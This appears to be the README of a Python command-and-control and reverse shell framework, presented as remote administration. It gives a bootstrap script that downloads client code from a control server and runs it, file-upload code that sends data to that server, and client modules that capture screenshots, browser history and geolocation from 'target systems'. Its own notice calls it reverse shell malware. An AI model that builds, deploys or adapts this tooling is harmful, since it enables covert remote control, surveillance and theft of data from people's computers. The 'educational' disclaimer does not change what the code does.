# 🐍 Python C2/Reverse Shell

A modular client-server framework for remote system administration and management.  
This tool provides a flexible architecture for executing commands and modules on remote clients from a central server.

---

## ✨ Features

- **Modular Architecture** – Dynamic loading of server and client modules  
- **Secure Communication** – Encrypted data transfer between server and clients  
- **Persistent Module Storage** – Store modules on clients for later execution  
- **Remote Command Execution** – Run commands on connected clients  
- **File Transfer** – Send and receive files between server and clients  
- **Geolocation Tracking** – Determine client geographic location  
- **Browser History Analysis** – Retrieve and analyze browser history  
- **Screenshot Capability** – Capture client screen contents  
- **Failsafe Mechanism** – Maintain connections in unstable environments  

---

## 📁 Project Structure

<details>
<summary>Click to expand</summary>

```
.
├── server/
│   ├── main.py                 # Main server implementation
│   ├── modules/                # Server-side modules
│   │   ├── storemod.py         # Store code on clients
│   │   ├── runmod.py           # Run stored code on clients
│   │   ├── file_transfer.py    # File transfer functionality
│   │   ├── geoloc.py           # Geolocation command handler
│   │   └── example.py          # Example module template
│   ├── client_modules/         # Client modules stored on the server
│   │   ├── geoloc.py           # Geolocation module
│   │   ├── history.py          # Browser history retrieval
│   │   └── screenshot.py       # Screen capture functionality
│   ├── websitefailsafe.py      # HTTP server for client delivery
│   ├── testserver.py           # Testing server implementation
│   └── payload2.py             # Server-side client template
│
├── client/
│   ├── payload2.py             # Main client implementation
│   ├── failsafe.py             # Connection recovery mechanism
│   └── modules/                # Client-side modules
│       ├── geoloc.py           # Geolocation module
│       ├── history.py          # Browser history retrieval
│       └── screenshot.py       # Screen capture functionality
│
└── upload/                   # screenshots captured via the screenshot module


```
</details>

---

## 🚀 Getting Started

<details>
<summary><strong>Server Setup</strong></summary>

1. Clone this repository  
2. Navigate to the server directory  
3. Run the server:  
   ```
   python main.py
   ```
</details>

<details>
<summary><strong>Client Setup</strong></summary>

1. Deploy the client code to target systems  
2. Run the client:  
   ```
   python payload2.py
   ```
</details>

---

## 🛡️ Setting Up the HTTP Failsafe Server

<details>
<summary>Click to expand detailed setup instructions</summary>

### Prerequisites

- Install Flask:
  ```
  pip install flask
  ```
- Ensure `payload2.py` is in the same directory as `websitefailsafe.py`

### Step-by-Step Setup

1. **Start the HTTP Server**  
   ```
   python websitefailsafe.py
   ```
   The server will start on port 5000 and listen on all interfaces (`0.0.0.0`).

2. **Configure Connection Information**  
   By default:
   ```python
   @app.route('/get_target', methods=['GET'])
   def get_target():
       return jsonify({
           'ip': '127.0.0.1',
           'port': 4444
       })
   ```
   (For local testing, `127.0.0.1` and port `4444`.)

3. **Verify Server Operation**  
   Visit: [http://localhost:5000/get_target](http://localhost:5000/get_target)  
   You should see JSON output with the IP and port information.

4. **Access the Client Code**  
   [http://localhost:5000/get_client_code](http://localhost:5000/get_client_code)  
   (Serves the `payload2.py` file.)

### Using with Clients

- Clients can fetch code and connection info from this server.

**Example bootstrap script:**
```python
import urllib.request
import json
import subprocess
import sys
import os

SERVER_URL = "http://localhost:5000"
client_code_path = "client.py"
urllib.request.urlretrieve(f"{SERVER_URL}/get_client_code", client_code_path)

with urllib.request.urlopen(f"{SERVER_URL}/get_target") as response:
    target_info = json.loads(response.read())
    host = target_info['ip']
    port = target_info['port']

subprocess.run([sys.executable, client_code_path, "--host", host, "--port", str(port)])
```

### File Upload Functionality

- Modules can upload files to `/upload` (HTTP POST)
- Uploaded files are stored in the `uploads` directory
- Files can be accessed at `/uploads/<filename>`

**Example upload code:**
```python
import requests
import os

def upload_file(filepath, server_url="http://localhost:5000"):
    filename = os.path.basename(filepath)
    with open(filepath, 'rb') as f:
        files = {'file': (filename, f)}
        response = requests.post(f"{server_url}/upload", files=files)
    return response.text
```

### Security Considerations

- No authentication by default
- Not encrypted (HTTP)
- Binds to all interfaces (`0.0.0.0`)

**For production:**
- Add authentication
- Use HTTPS
- IP restrictions
- Input validation & file type checking

</details>

---

## 🧩 Module System

<details>
<summary><strong>Creating Server Modules</strong></summary>

1. Create a new Python file in `server/modules/`
2. Define a `register(server)` function to register commands
3. Implement command handler functions

**Example:**
```python
def register(server):
    def echo_cmd(args, server):
        """Echo the arguments back to the console"""
        print(f"Echo: {' '.join(args)}")
    server.register_command("echo", echo_cmd, "Echo the arguments back to the console")
```
</details>

<details>
<summary><strong>Creating Client Modules</strong></summary>

- Standalone Python script
- Implements required functionality
- Prints or returns results

**Example:**
```python
def run():
    import platform
    system_info = {
        "System": platform.system(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    output = "\n".join([f"{k}: {v}" for k, v in system_info.items()])
    print(output)
    return output

run()
```
</details>

---

## 💾 Using `storemod` and `runmod`

<details>
<summary><strong>Storing Modules on Clients</strong></summary>

1. Connect to a client
2. Run the `storemod` command
3. Enter the module name (e.g., `geoloc`)
4. Provide the path to the Python module

```
> storemod
[?] Select client: 1
Module name (e.g., geoloc): geoloc
Path to Python module to push: client/modules/geoloc.py
[*] Module sent, waiting for client output...
[Client Output]
Module 'geoloc' stored successfully
```
</details>

<details>
<summary><strong>Running Stored Modules on Clients</strong></summary>

1. Connect to a client
2. Run the `runmod` command
3. Enter the name of the stored module

```
> runmod
[?] Select client: 1
Module name to run: geoloc
[*] Run command sent, waiting for client output...
[Client Output]
IP: 203.0.113.1
Country: United States (US)
Region: California
City: San Francisco
ZIP: 94105
Latitude: 37.7749
Longitude: -122.4194
Timezone: America/Los_Angeles
ISP: Example ISP
Org: Example Org
```
</details>

---

## ⚠️ Security & Legal Notice

This tool is intended for **educational purposes only, demonstrating a reverse shell malware**.  
**Unauthorized use against systems you don't own or have explicit permission to test may violate laws.**

---

## 📝 Disclaimer

This software is provided for educational and research purposes only.  
The author does **not** take responsibility for any misuse or damage caused by this program.
